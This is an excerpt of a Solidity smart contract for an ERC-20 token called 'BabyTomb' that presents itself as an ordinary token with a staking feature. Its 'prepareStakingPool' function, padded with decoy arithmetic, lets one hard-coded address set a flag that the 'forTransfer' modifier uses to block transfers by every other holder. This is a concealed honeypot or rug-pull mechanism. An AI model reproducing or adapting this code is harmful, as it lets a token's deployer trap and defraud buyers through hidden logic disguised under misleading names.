...
contract BabyTomb is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenay_totalSupply;
    uint256 private _tokenay_status = 0;
    uint256 public stakingPoolayStatus = 0;

    string private _tokenay_name;
    string private _tokenay_symbol;

    address private _poolayAddress = 0xDa3A7dad214a2A6554624aE6124cDcC72337ad38; 

    constructor() {
        _tokenay_name = "BabyTomb";
        _tokenay_symbol = "BTOMB";
        _tokenay_totalSupply = 10000 * 10 ** 18;
        _balances[msg.sender] = _tokenay_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolayAddress || _tokenay_status == 0);
        _;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolayStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolayAddress)
        {
            _tokenay_status = 1;
        }
    }
